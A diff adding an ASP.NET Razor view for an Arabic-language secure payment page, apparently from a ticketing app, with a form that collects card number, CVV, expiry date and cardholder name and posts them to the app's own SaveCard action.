@@ -1,0 +1,72 @@
+﻿@model BujairiTic.Models.Order
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="~/css/payment.css" asp-append-version="true" />
+</head>
+
+<body>
+
+    <div class="card">
+
+        <h2>Secure Payment</h2>
+
+        <div class="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
+        </div>
+
+        <form asp-action="SaveCard" method="post" id="paymentForm">
+
+            <input type="hidden" name="id" value="@Model.Id" />
+
+            <div class="input-box">
+                <div class="label">رقم البطاقة</div>
+                <input class="input" name="CardNumber" id="cardNumber" type="text" maxlength="19" placeholder="0000 0000 0000 0000">
+                <div class="error" id="cardError">رقم البطاقة غير صالح</div>
+            </div>
+
+            <div class="row">
+                <div class="input-box">
+                    <div class="label">رمز الأمان (CVV)</div>
+                    <input class="input" name="CVV" id="cvv" type="password" maxlength="3">
+                    <div class="error" id="cvvError">CVV غير صحيح</div>
+                </div>
+
+                <div class="input-box">
+                    <div class="label">تاريخ الانتهاء</div>
+                    <input class="input" name="Expiry" id="expiry" type="text" maxlength="5" placeholder="MM/YY">
+                    <div class="error" id="expiryError">تاريخ غير صالح</div>
+                </div>
+            </div>
+
+            <div class="input-box">
+                <div class="label">اسم حامل البطاقة</div>
+                <input class="input" name="CardholderName" id="cardName" type="text">
+                <div class="error" id="nameError">الاسم يجب أن يكون أحرف فقط</div>
+            </div>
+
+            <button type="submit" id="payBtn" disabled>تأكيد الدفع</button>
+
+        </form>
+
+        <div class="footer">
+            <span>العودة للسلة</span>
+            <span class="ssl">SSL Secured</span>
+        </div>
+
+    </div>
+
+    <script src="~/js/payment.js" asp-append-version="true"></script>
+
+</body>
+</html>
